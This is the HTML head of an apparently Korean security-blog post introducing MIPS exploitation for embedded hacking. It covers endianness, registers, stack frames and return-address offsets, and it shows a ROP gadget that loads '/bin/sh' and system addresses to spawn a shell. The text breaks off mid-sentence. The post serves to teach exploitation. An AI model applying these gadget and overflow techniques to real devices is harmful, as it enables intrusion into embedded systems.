

<!DOCTYPE html>
<html lang="ko-KR" data-default-color-scheme="&#34;auto&#34;">



<head>
  <meta charset="UTF-8">
  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.ico">
  <link rel="icon" type="image/png" href="/img/favicon.ico">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
  <meta name="theme-color" content="#2f4154">
  <meta name="description" content="&lt;p&gt;&amp;#xC548;&amp;#xB155;&amp;#xD558;&amp;#xC138;&amp;#xC694;! Hackyboiz&amp;#xC5D0;&amp;#xC11C; &amp;#xAC00;&amp;#xC7A5; &amp;#xB0AE;&amp;#xC740; &amp;#xACF3;(low-level)&amp;#xC744; &amp;#xB9E1;&amp;#xACE0; &amp;#xC788;&amp;#xB294; &lt;code&gt;newp1ayer48&lt;/code&gt; &amp;#xC785;&amp;#xB2C8;&amp;#xB2E4;! &amp;#x1F938;&amp;#x1F3FB;&amp;#x200D;&amp;#x2642;&amp;#xFE0F;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image1.jpg&#34; alt=&#34;image1.jpg&#34;&gt;&lt;/p&gt;
&lt;p&gt;&amp;#xC784;&amp;#xBCA0;&amp;#xB514;&amp;#xB4DC; &amp;#xD574;&amp;#xD0B9;&amp;#xC744; &amp;#xC9C4;&amp;#xD589;&amp;#xD558;&amp;#xB2E4; &amp;#xBCF4;&amp;#xBA74;, &amp;#xB2E4;&amp;#xC591;&amp;#xD55C; RISC &amp;#xC544;&amp;#xD0A4;&amp;#xD14D;&amp;#xCC98;&amp;#xC758; &amp;#xBC14;&amp;#xC774;&amp;#xB108;&amp;#xB9AC;&amp;#xC640; &amp;#xD658;&amp;#xACBD;&amp;#xC744; &amp;#xB9CC;&amp;#xB098;&amp;#xAC8C; &amp;#xB429;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;p&gt;&amp;#xB300;&amp;#xBD80;&amp;#xBD84; ARM &amp;#xC544;&amp;#xD0A4;&amp;#xD14D;&amp;#xCC98;&amp;#xB97C; &amp;#xB9CE;&amp;#xC774; &amp;#xC0AC;&amp;#xC6A9;&amp;#xD558;&amp;#xACE0; &amp;#xC811;&amp;#xD558;&amp;#xB294; &amp;#xACBD;&amp;#xC6B0;&amp;#xAC00; &amp;#xB9CE;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xADF8;&amp;#xB7EC;&amp;#xB098; MIPS, MIPSEL &amp;#xC544;&amp;#xD0A4;&amp;#xD14D;&amp;#xCC98; &amp;#xC5ED;&amp;#xC2DC; &amp;#xC5B4;&amp;#xB835;&amp;#xC9C0; &amp;#xC54A;&amp;#xAC8C; &amp;#xB9C8;&amp;#xC8FC;&amp;#xCE60; &amp;#xC218; &amp;#xC788;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;&amp;#x2026;&lt;/p&gt;
&lt;p&gt;&amp;#xC5B4;&amp;#xC148; &amp;#xBA85;&amp;#xB839;&amp;#xC5B4;&amp;#xC640; &amp;#xB808;&amp;#xC9C0;&amp;#xC2A4;&amp;#xD130;&amp;#xAC00; &amp;#xC0DD;&amp;#xAE34; &amp;#xAC83;&amp;#xBD80;&amp;#xD130; &amp;#xB0AF;&amp;#xC124;&amp;#xACE0;, &amp;#xAC8C;&amp;#xB2E4;&amp;#xAC00; Cache &amp;#xB54C;&amp;#xBB38;&amp;#xC5D0; &amp;#xACE0;&amp;#xB824;&amp;#xD560; &amp;#xAC83;&amp;#xAE4C;&amp;#xC9C0;&amp;#x2026;&lt;/p&gt;
&lt;p&gt;&amp;#xB2E4;&amp;#xC18C; &amp;#xC774;&amp;#xC9C8;&amp;#xC801;&amp;#xC778; &amp;#xC774; MIPS&amp;#xC5D0;&amp;#xC11C; &amp;#xC775;&amp;#xC2A4;&amp;#xD50C;&amp;#xB85C;&amp;#xC787;&amp;#xC5D0; &amp;#xD544;&amp;#xC694;&amp;#xD55C; &amp;#xAC00;&amp;#xC7A5; &amp;#xAE30;&amp;#xBCF8;&amp;#xC801;&amp;#xC778; &amp;#xBD80;&amp;#xBD84;&amp;#xC744; &amp;#xB2E4;&amp;#xB904;&amp;#xBCF4;&amp;#xACA0;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;!&lt;/p&gt;
&lt;h2 id=&#34;1-MIPS-vs-MIPSEL&#34;&gt;&lt;a href=&#34;#1-MIPS-vs-MIPSEL&#34; class=&#34;headerlink&#34; title=&#34;1. MIPS vs MIPSEL&#34;&gt;&lt;/a&gt;1. MIPS vs MIPSEL&lt;/h2&gt;&lt;p&gt;&lt;img src=&#34;image2.jpg&#34; alt=&#34;image2.jpg&#34;&gt;&lt;/p&gt;
&lt;p&gt;MIPS&amp;#xB294; &amp;#xB808;&amp;#xC9C0;&amp;#xC2A4;&amp;#xD130;&amp;#xC640; &amp;#xBA85;&amp;#xB839;&amp;#xC774; &amp;#xD558;&amp;#xB098;&amp;#xC758; &amp;#xC5ED;&amp;#xD560;&amp;#xC744; &amp;#xC218;&amp;#xD589;&amp;#xD558;&amp;#xB3C4;&amp;#xB85D; &amp;#xC124;&amp;#xACC4;&amp;#xB41C; RISC &amp;#xC544;&amp;#xD0A4;&amp;#xD14D;&amp;#xCC98; &amp;#xC911;&amp;#xC5D0; &amp;#xD558;&amp;#xB098; &amp;#xC785;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xB808;&amp;#xC9C0;&amp;#xC2A4;&amp;#xD130;&amp;#xAC00; &amp;#xB9CE;&amp;#xC544;&amp;#xC9C4;&amp;#xB2E4;&amp;#xB294; &amp;#xB2E8;&amp;#xC810;&amp;#xC774; &amp;#xC788;&amp;#xC9C0;&amp;#xB9CC;, &amp;#xBA85;&amp;#xB839;&amp;#xC5B4;&amp;#xAC00; &amp;#xB2E8;&amp;#xC21C;&amp;#xD558;&amp;#xACE0; &amp;#xADF8;&amp;#xB85C; &amp;#xC778;&amp;#xD574; &amp;#xC804;&amp;#xB825; &amp;#xC18C;&amp;#xBAA8;&amp;#xAC00; &amp;#xC801;&amp;#xAE30; &amp;#xB54C;&amp;#xBB38;&amp;#xC5D0; &amp;#xC784;&amp;#xBCA0;&amp;#xB514;&amp;#xB4DC; &amp;#xAE30;&amp;#xAE30;&amp;#xC5D0;&amp;#xC11C; &amp;#xC8FC;&amp;#xB85C; &amp;#xC0AC;&amp;#xC6A9;&amp;#xB429;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;p&gt;MIPS&amp;#xB294; &amp;#xBA85;&amp;#xB839;&amp;#xC5B4; &amp;#xC138;&amp;#xD2B8;&amp;#xAC00; &amp;#xAE54;&amp;#xB054;&amp;#xD558;&amp;#xAC8C; &amp;#xC815;&amp;#xB9AC;&amp;#xB418;&amp;#xC5C8;&amp;#xAE30; &amp;#xB54C;&amp;#xBB38;&amp;#xC5D0;, &amp;#xB300;&amp;#xD559; &amp;#xCEF4;&amp;#xD4E8;&amp;#xD130; &amp;#xAD6C;&amp;#xC870; &amp;#xB54C; &amp;#xAC00;&amp;#xB974;&amp;#xCE58;&amp;#xB294; &amp;#xC544;&amp;#xD0A4;&amp;#xD14D;&amp;#xCC98;&amp;#xAC00; MIPS&amp;#xC778; &amp;#xACBD;&amp;#xC6B0;&amp;#xAC00; &amp;#xB9CE;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;(&amp;#xC800;&amp;#xB3C4; &amp;#xADF8;&amp;#xB7AC;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;)&amp;#x2026;&lt;/p&gt;
&lt;p&gt;MIPS&amp;#xB294; &amp;#xBE45;&amp;#xC5D4;&amp;#xB514;&amp;#xC548;, MIPSEL&amp;#xC740; &amp;#xB9AC;&amp;#xD2C0;&amp;#xC5D4;&amp;#xB514;&amp;#xC548;&amp;#xC73C;&amp;#xB85C; &amp;#xC774;&amp;#xB8E8;&amp;#xC5B4;&amp;#xC9D1;&amp;#xB2C8;&amp;#xB2E4;. MIPSEL&amp;#xC740; &amp;#xB370;&amp;#xC774;&amp;#xD130; &amp;#xC800;&amp;#xC7A5; &amp;#xBC29;&amp;#xC2DD;&amp;#xB9CC; &amp;#xB9AC;&amp;#xD2C0;&amp;#xC5D4;&amp;#xB514;&amp;#xC548;&amp;#xC73C;&amp;#xB85C; &amp;#xCC44;&amp;#xD0DD;&amp;#xD558;&amp;#xAE30; &amp;#xB54C;&amp;#xBB38;&amp;#xC5D0;, MIPS&amp;#xC640; &amp;#xAC19;&amp;#xC740; &amp;#xBC29;&amp;#xC2DD;&amp;#xC73C;&amp;#xB85C; &amp;#xB3D9;&amp;#xC791;&amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xAE30;&amp;#xC874;&amp;#xC5D0; &amp;#xB9CE;&amp;#xC774; &amp;#xC0AC;&amp;#xC6A9;&amp;#xD558;&amp;#xB294; x86-64 &amp;#xC544;&amp;#xD0A4;&amp;#xD14D;&amp;#xCC98;&amp;#xC5D0;&amp;#xC11C;&amp;#xB3C4; &amp;#xB370;&amp;#xC774;&amp;#xD130; &amp;#xC800;&amp;#xC7A5; &amp;#xBC29;&amp;#xC2DD;&amp;#xC744; &amp;#xC0AC;&amp;#xC6A9;&amp;#xD558;&amp;#xAE30; &amp;#xB54C;&amp;#xBB38;&amp;#xC5D0;, MIPSEL&amp;#xB3C4; &amp;#xB3D9;&amp;#xC77C;&amp;#xD558;&amp;#xAC8C; pwntools &amp;#xD568;&amp;#xC218;&amp;#xB97C; &amp;#xC0AC;&amp;#xC6A9;&amp;#xD560; &amp;#xC218; &amp;#xC788;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xB530;&amp;#xB77C;&amp;#xC11C;, MIPSEL &amp;#xD658;&amp;#xACBD;&amp;#xC5D0;&amp;#xC11C;&amp;#xB294; pwntools&amp;#xC758; &lt;code&gt;p32()&lt;/code&gt;, &lt;code&gt;p64()&lt;/code&gt;&amp;#xB97C; &amp;#xADF8;&amp;#xB300;&amp;#xB85C; &amp;#xC0AC;&amp;#xC6A9;&amp;#xD558;&amp;#xC2DC;&amp;#xBA74; &amp;#xB429;&amp;#xB2C8;&amp;#xB2E4;!&lt;/p&gt;
&lt;h2 id=&#34;2-MIPS-Stack-amp-Register&#34;&gt;&lt;a href=&#34;#2-MIPS-Stack-amp-Register&#34; class=&#34;headerlink&#34; title=&#34;2. MIPS Stack &amp;amp; Register&#34;&gt;&lt;/a&gt;2. MIPS Stack &amp;amp; Register&lt;/h2&gt;&lt;p&gt;&amp;#xC775;&amp;#xC2A4;&amp;#xD50C;&amp;#xB85C;&amp;#xC787;&amp;#xC5D0; &amp;#xC55E;&amp;#xC11C; MIPS &amp;#xD658;&amp;#xACBD;&amp;#xC5D0;&amp;#xC11C; &amp;#xC2A4;&amp;#xD0DD; &amp;#xAD6C;&amp;#xC131;&amp;#xACFC; &amp;#xB3D9;&amp;#xC791;&amp;#xC744; &amp;#xC774;&amp;#xD574;&amp;#xD560; &amp;#xD544;&amp;#xC694;&amp;#xAC00; &amp;#xC788;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;p&gt;MIPS &amp;#xC544;&amp;#xD0A4;&amp;#xD14D;&amp;#xCC98;&amp;#xC758; &amp;#xACF5;&amp;#xC2DD; &amp;#xB808;&amp;#xD37C;&amp;#xB7F0;&amp;#xC2A4;&amp;#xB294; &lt;a href=&#34;https://www.cs.cornell.edu/courses/cs3410/2008fa/MIPS_Vol1.pdf&#34;&gt;MIPS32 Architecture For Programmers Volume I&lt;/a&gt;&amp;#xACFC; &lt;a href=&#34;https://www.cs.unibo.it/~solmi/teaching/arch_2002-2003/AssemblyLanguageProgDoc.pdf&#34;&gt;MIPS Assembly Language Programmer&amp;#x2019;s Guide&lt;/a&gt; &amp;#xC785;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;p&gt;&amp;#xC774;&amp;#xC911; &amp;#xC775;&amp;#xC2A4;&amp;#xD50C;&amp;#xB85C;&amp;#xC787; &amp;#xAD00;&amp;#xC810;&amp;#xC5D0;&amp;#xC11C; &amp;#xC6B0;&amp;#xB9AC;&amp;#xC5D0;&amp;#xAC8C; &amp;#xD544;&amp;#xC694;&amp;#xD55C; &amp;#xC9C0;&amp;#xC2DD;&amp;#xC744; &amp;#xB2E4;&amp;#xB904;&amp;#xBCF4;&amp;#xACA0;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xC6B0;&amp;#xC120;, MIPS&amp;#xC5D0;&amp;#xC11C; &amp;#xC0AC;&amp;#xC6A9;&amp;#xB418;&amp;#xB294; &amp;#xB808;&amp;#xC9C0;&amp;#xC2A4;&amp;#xD130; &amp;#xBAA9;&amp;#xB85D;&amp;#xACFC; &amp;#xC5ED;&amp;#xD560;&amp;#xC740; &amp;#xC544;&amp;#xB798;&amp;#xC640; &amp;#xAC19;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;div class=&#34;table-container&#34;&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;&amp;#xC774;&amp;#xB984;&lt;/th&gt;
&lt;th&gt;&amp;#xB808;&amp;#xC9C0;&amp;#xC2A4;&amp;#xD130; &amp;#xBC88;&amp;#xD638;&lt;/th&gt;
&lt;th&gt;&amp;#xC5ED;&amp;#xD560;&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;&lt;strong&gt;&lt;code&gt;$zero&lt;/code&gt;&lt;/strong&gt;&lt;/td&gt;
&lt;td&gt;&lt;strong&gt;&lt;code&gt;$0&lt;/code&gt;&lt;/strong&gt;&lt;/td&gt;
&lt;td&gt;0&amp;#xC744; &amp;#xCD9C;&amp;#xB825;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;strong&gt;&lt;code&gt;$at&lt;/code&gt;&lt;/strong&gt;&lt;/td&gt;
&lt;td&gt;&lt;strong&gt;&lt;code&gt;$1&lt;/code&gt;&lt;/strong&gt;&lt;/td&gt;
&lt;td&gt;&amp;#xC758;&amp;#xC0AC; &amp;#xBA85;&amp;#xB839;&amp;#xC5B4; &amp;#xACC4;&amp;#xC0B0; &amp;#xACB0;&amp;#xACFC;&amp;#xB97C; &amp;#xC704;&amp;#xD574; &amp;#xC608;&amp;#xC57D;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;strong&gt;&lt;code&gt;$v0&lt;/code&gt; ~ &lt;code&gt;$v1&lt;/code&gt;&lt;/strong&gt;&lt;/td&gt;
&lt;td&gt;&lt;strong&gt;&lt;code&gt;$2&lt;/code&gt; ~ &lt;code&gt;$3&lt;/code&gt;&lt;/strong&gt;&lt;/td&gt;
&lt;td&gt;&amp;#xD568;&amp;#xC218;&amp;#xB85C;&amp;#xBD80;&amp;#xD130; &amp;#xBC18;&amp;#xD658; &amp;#xB41C; &amp;#xAC12;&amp;#xC744; &amp;#xC800;&amp;#xC7A5;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;strong&gt;&lt;code&gt;$a0&lt;/code&gt; ~ &lt;code&gt;$a3&lt;/code&gt;&lt;/strong&gt;&lt;/td&gt;
&lt;td&gt;&lt;strong&gt;&lt;code&gt;$4&lt;/code&gt; ~ &lt;code&gt;$7&lt;/code&gt;&lt;/strong&gt;&lt;/td&gt;
&lt;td&gt;&amp;#xD568;&amp;#xC218; &amp;#xC778;&amp;#xC218; &amp;#xC800;&amp;#xC7A5;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;strong&gt;&lt;code&gt;$t0&lt;/code&gt; ~ &lt;code&gt;$t7&lt;/code&gt;&lt;/strong&gt;&lt;/td&gt;
&lt;td&gt;&lt;strong&gt;&lt;code&gt;$8&lt;/code&gt; ~ &lt;code&gt;$15&lt;/code&gt;&lt;/strong&gt;&lt;/td&gt;
&lt;td&gt;&amp;#xC5B4;&amp;#xC148;&amp;#xBE14;&amp;#xB7EC;&amp;#xB098; &amp;#xC5B8;&amp;#xC5B4;&amp;#xC5D0;&amp;#xC11C; &amp;#xAC12;&amp;#xC744; &amp;#xC784;&amp;#xC2DC; &amp;#xC800;&amp;#xC7A5; &amp;#xC2DC; &amp;#xC0AC;&amp;#xC6A9;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;strong&gt;&lt;code&gt;$s0&lt;/code&gt; ~ &lt;code&gt;$s7&lt;/code&gt;&lt;/strong&gt;&lt;/td&gt;
&lt;td&gt;&lt;strong&gt;&lt;code&gt;$16&lt;/code&gt; ~ &lt;code&gt;$23&lt;/code&gt;&lt;/strong&gt;&lt;/td&gt;
&lt;td&gt;&amp;#xC624;&amp;#xB7AB;&amp;#xB3D9;&amp;#xC548; &amp;#xC9C0;&amp;#xC18D;&amp;#xB418;&amp;#xB294; &amp;#xAC12;&amp;#xC744; &amp;#xC800;&amp;#xC7A5;&amp;#xD560; &amp;#xB54C; &amp;#xC0AC;&amp;#xC6A9;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;strong&gt;&lt;code&gt;$t8&lt;/code&gt; ~ &lt;code&gt;$t9&lt;/code&gt;&lt;/strong&gt;&lt;/td&gt;
&lt;td&gt;&lt;strong&gt;&lt;code&gt;$24&lt;/code&gt; ~ &lt;code&gt;$25&lt;/code&gt;&lt;/strong&gt;&lt;/td&gt;
&lt;td&gt;&amp;#xC5B4;&amp;#xC148;&amp;#xBE14;&amp;#xB7EC;&amp;#xB098; &amp;#xC5B8;&amp;#xC5B4;&amp;#xC5D0;&amp;#xC11C; &amp;#xAC12;&amp;#xC744; &amp;#xC784;&amp;#xC2DC;&amp;#xB85C; &amp;#xC800;&amp;#xC7A5;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;strong&gt;&lt;code&gt;$k0&lt;/code&gt; ~ &lt;code&gt;$k1&lt;/code&gt;&lt;/strong&gt;&lt;/td&gt;
&lt;td&gt;&lt;strong&gt;&lt;code&gt;$26&lt;/code&gt; ~ &lt;code&gt;$27&lt;/code&gt;&lt;/strong&gt;&lt;/td&gt;
&lt;td&gt;OS &amp;#xCEE4;&amp;#xB110;&amp;#xC744; &amp;#xC704;&amp;#xD574; &amp;#xC608;&amp;#xC57D;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;strong&gt;&lt;code&gt;$gp&lt;/code&gt;&lt;/strong&gt;&lt;/td&gt;
&lt;td&gt;&lt;strong&gt;&lt;code&gt;$28&lt;/code&gt;&lt;/strong&gt;&lt;/td&gt;
&lt;td&gt;&amp;#xC804;&amp;#xC5ED; &amp;#xD3EC;&amp;#xC778;&amp;#xD130;&amp;#xC758; &amp;#xAC12;&amp;#xC744; &amp;#xC800;&amp;#xC7A5;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;strong&gt;&lt;code&gt;$sp&lt;/code&gt;&lt;/strong&gt;&lt;/td&gt;
&lt;td&gt;&lt;strong&gt;&lt;code&gt;$29&lt;/code&gt;&lt;/strong&gt;&lt;/td&gt;
&lt;td&gt;&amp;#xC2A4;&amp;#xD0DD; &amp;#xD3EC;&amp;#xC778;&amp;#xD130;&amp;#xC758; &amp;#xAC12;&amp;#xC744; &amp;#xC800;&amp;#xC7A5;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;strong&gt;&lt;code&gt;$fp&lt;/code&gt;/&lt;code&gt;$s8&lt;/code&gt;&lt;/strong&gt;&lt;/td&gt;
&lt;td&gt;&lt;strong&gt;&lt;code&gt;$30&lt;/code&gt;&lt;/strong&gt;&lt;/td&gt;
&lt;td&gt;&amp;#xD504;&amp;#xB808;&amp;#xC784; &amp;#xD3EC;&amp;#xC778;&amp;#xD130;&amp;#xC758; &amp;#xAC12;&amp;#xC744; &amp;#xC800;&amp;#xC7A5;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;strong&gt;&lt;code&gt;$ra&lt;/code&gt;&lt;/strong&gt;&lt;/td&gt;
&lt;td&gt;&lt;strong&gt;&lt;code&gt;$31&lt;/code&gt;&lt;/strong&gt;&lt;/td&gt;
&lt;td&gt;&amp;#xC8FC;&amp;#xC18C; &amp;#xBC18;&amp;#xD658;&amp;#xAC12;&amp;#xC744; &amp;#xC800;&amp;#xC7A5;&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;/div&gt;
&lt;p&gt;&amp;#xC774;&amp;#xC911; &amp;#xB208; &amp;#xC5EC;&amp;#xACA8; &amp;#xBD10;&amp;#xC57C; &amp;#xD560; &amp;#xB808;&amp;#xC9C0;&amp;#xC2A4;&amp;#xD130;&amp;#xB294; &lt;code&gt;ra&lt;/code&gt;, &lt;code&gt;sp&lt;/code&gt;, &lt;code&gt;s8&lt;/code&gt;&amp;#xC785;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;p&gt;MIPS&amp;#xC5D0;&amp;#xC11C;&amp;#xB294; &lt;code&gt;ra&lt;/code&gt; &amp;#xB808;&amp;#xC9C0;&amp;#xC2A4;&amp;#xD130;&amp;#xAC00; &amp;#xD568;&amp;#xC218; &amp;#xB9AC;&amp;#xD134; &amp;#xC8FC;&amp;#xC18C;&amp;#xB97C; &amp;#xAC00;&amp;#xC9D1;&amp;#xB2C8;&amp;#xB2E4;. x86/x64&amp;#xC758; &lt;code&gt;RET&lt;/code&gt;&amp;#xC758; &amp;#xC5ED;&amp;#xD560;&amp;#xC744; &amp;#xD55C;&amp;#xB2E4;&amp;#xACE0; &amp;#xC0DD;&amp;#xAC01;&amp;#xD558;&amp;#xBA74; &amp;#xD3B8;&amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;hljs nasm&#34;&gt;0x00400734 &amp;lt;main+0&amp;gt;:    addiu   sp,sp,-136
0x00400738 &amp;lt;main+4&amp;gt;:    sw      ra,132(sp)
0x0040073c &amp;lt;main+8&amp;gt;:    sw      s8,128(sp)
0x00400740 &amp;lt;main+12&amp;gt;:   move    s8,sp
...
0x004007d8 &amp;lt;main+164&amp;gt;:  move    sp,s8
0x004007dc &amp;lt;main+168&amp;gt;:  lw      ra,132(sp)
0x004007e0 &amp;lt;main+172&amp;gt;:  lw      s8,128(sp)
0x004007e4 &amp;lt;main+176&amp;gt;:  addiu   sp,sp,136
0x004007e8 &amp;lt;main+180&amp;gt;:  jr      ra&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&amp;#xD568;&amp;#xC218; &amp;#xD504;&amp;#xB864;&amp;#xB85C;&amp;#xADF8;&amp;#xB97C; &amp;#xD1B5;&amp;#xD574; &lt;code&gt;ra&lt;/code&gt; &amp;#xB808;&amp;#xC9C0;&amp;#xC2A4;&amp;#xD130;&amp;#xC5D0; &amp;#xC874;&amp;#xC7AC;&amp;#xD558;&amp;#xB294; &amp;#xB9AC;&amp;#xD134; &amp;#xC8FC;&amp;#xC18C;&amp;#xB97C; &amp;#xC2A4;&amp;#xD0DD;&amp;#xC5D0; &amp;#xC800;&amp;#xC7A5;&amp;#xD558;&amp;#xACE0;, &amp;#xD568;&amp;#xC218; &amp;#xC5D0;&amp;#xD544;&amp;#xB85C;&amp;#xADF8;&amp;#xB97C; &amp;#xD1B5;&amp;#xD574; &lt;code&gt;ra&lt;/code&gt; &amp;#xB808;&amp;#xC9C0;&amp;#xC2A4;&amp;#xD130;&amp;#xC5D0; &amp;#xC874;&amp;#xC7AC;&amp;#xD558;&amp;#xB294; &amp;#xB9AC;&amp;#xD134; &amp;#xC8FC;&amp;#xC18C;&amp;#xB85C; &amp;#xC774;&amp;#xB3D9;&amp;#xD558;&amp;#xB294; &amp;#xAD6C;&amp;#xC870;&amp;#xB85C; &amp;#xC774;&amp;#xB8E8;&amp;#xC5B4;&amp;#xC9D1;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;p&gt;&lt;code&gt;ra&lt;/code&gt; &amp;#xB808;&amp;#xC9C0;&amp;#xC2A4;&amp;#xD130;&amp;#xB294; &lt;code&gt;sp&lt;/code&gt;(&amp;#xD604;&amp;#xC7AC; &amp;#xC2A4;&amp;#xD0DD; &amp;#xD3EC;&amp;#xC778;&amp;#xD130;)&amp;#xC640; &lt;code&gt;s8&lt;/code&gt;(&amp;#xD504;&amp;#xB808;&amp;#xC784; &amp;#xD3EC;&amp;#xC778;&amp;#xD130;) &amp;#xB808;&amp;#xC9C0;&amp;#xC2A4;&amp;#xD130;&amp;#xB97C; &amp;#xD1B5;&amp;#xD574; &amp;#xB9AC;&amp;#xD134; &amp;#xC8FC;&amp;#xC18C;&amp;#xB97C; &amp;#xC2A4;&amp;#xD0DD;&amp;#xC5D0; &amp;#xC800;&amp;#xC7A5;&amp;#xD558;&amp;#xAE30; &amp;#xB54C;&amp;#xBB38;&amp;#xC5D0;, &lt;code&gt;sp&lt;/code&gt; &amp;#xB808;&amp;#xC9C0;&amp;#xC2A4;&amp;#xD130;&amp;#xB97C; &amp;#xAE30;&amp;#xC900;&amp;#xC73C;&amp;#xB85C; &amp;#xBC84;&amp;#xD37C; &amp;#xC2DC;&amp;#xC791; &amp;#xC704;&amp;#xCE58;&amp;#xC640; &amp;#xB9AC;&amp;#xD134; &amp;#xC8FC;&amp;#xC18C;&amp;#xB97C; &amp;#xACC4;&amp;#xC0B0;&amp;#xD558;&amp;#xC5EC; &amp;#xC624;&amp;#xD504;&amp;#xC14B;&amp;#xC744; &amp;#xAD6C;&amp;#xD558;&amp;#xB294; &amp;#xAC83;&amp;#xC774; &amp;#xC2A4;&amp;#xD0DD; &amp;#xAE30;&amp;#xBC18; &amp;#xC775;&amp;#xC2A4;&amp;#xD50C;&amp;#xB85C;&amp;#xC787;&amp;#xC758; &amp;#xCCAB;&amp;#xAC78;&amp;#xC74C;&amp;#xC785;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;hljs nasm&#34;&gt;lw      $s2, 24(sp)      ; sp+24 &amp;#xC704;&amp;#xCE58;&amp;#xC758; &amp;#xAC12;&amp;#xC744; $s2&amp;#xC5D0; &amp;#xB85C;&amp;#xB4DC; (&amp;amp;&amp;quot;/bin/sh&amp;quot; &amp;#xC8FC;&amp;#xC18C;)
lw      $s1, 20(sp)      ; sp+20 &amp;#xC704;&amp;#xCE58;&amp;#xC758; &amp;#xAC12;&amp;#xC744; $s1&amp;#xC5D0; &amp;#xB85C;&amp;#xB4DC; (&amp;amp;system &amp;#xC8FC;&amp;#xC18C;)
lw      $s0, 16(sp)      ; sp+16 &amp;#xC704;&amp;#xCE58;&amp;#xC758; &amp;#xAC12;&amp;#xC744; $s0&amp;#xC5D0; &amp;#xB85C;&amp;#xB4DC; (&amp;amp;sleep &amp;#xC8FC;&amp;#xC18C;)
lw      $ra, 28(sp)      ; sp+28 &amp;#xC704;&amp;#xCE58;&amp;#xC758; &amp;#xAC12;&amp;#xC744; $ra&amp;#xC5D0; &amp;#xB85C;&amp;#xB4DC; (&amp;#xB2E4;&amp;#xC74C; &amp;#xAC00;&amp;#xC82F; &amp;#xC8FC;&amp;#xC18C;)
addiu   sp, sp, 32       ; &amp;#xC2A4;&amp;#xD0DD; &amp;#xD3EC;&amp;#xC778;&amp;#xD130; &amp;#xC815;&amp;#xB9AC;
jr      $ra              ; $ra(&amp;#xB2E4;&amp;#xC74C; &amp;#xAC00;&amp;#xC82F;)&amp;#xB85C; &amp;#xC810;&amp;#xD504;&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&amp;#xC774;&amp;#xD6C4;&amp;#xC5D0; &amp;#xC124;&amp;#xBA85;&amp;#xD560; Shellcode &amp;#xBC0F; ROP &amp;#xCCB4;&amp;#xC778;&amp;#xC5D0;&amp;#xC11C; &amp;#xD544;&amp;#xC694;&amp;#xD55C; &amp;#xAC00;&amp;#xC82F;&amp;#xC758; &amp;#xD615;&amp;#xD0DC;&amp;#xB97C; &amp;#xC704;&amp;#xC640; &amp;#xAC19;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;p&gt;&lt;code&gt;s0-s7&lt;/code&gt; &amp;#xB808;&amp;#xC9C0;&amp;#xC2A4;&amp;#xD130;&amp;#xB97C; &amp;#xD1B5;&amp;#xD574; &amp;#xC2A4;&amp;#xD0DD; &amp;#xB0B4; &amp;#xAC12;&amp;#xC744; &lt;code&gt;lw&lt;/code&gt; &amp;#xBA85;&amp;#xB839;&amp;#xC5B4;&amp;#xB85C; &amp;#xB85C;&amp;#xB4DC;&amp;#xD558;&amp;#xACE0;, &lt;code&gt;addiu&lt;/code&gt;&amp;#xB85C; &amp;#xC2A4;&amp;#xD0DD; &amp;#xD3EC;&amp;#xC778;&amp;#xD130;&amp;#xB97C; &amp;#xC815;&amp;#xB9AC;&amp;#xD55C; &amp;#xD6C4;, &amp;#xB9AC;&amp;#xD134; &amp;#xC8FC;&amp;#xC18C;&amp;#xB85C; &lt;code&gt;jr&lt;/code&gt;&amp;#xD558;&amp;#xB294; &amp;#xD615;&amp;#xD0DC;&amp;#xAC00; &amp;#xAC00;&amp;#xC7A5; 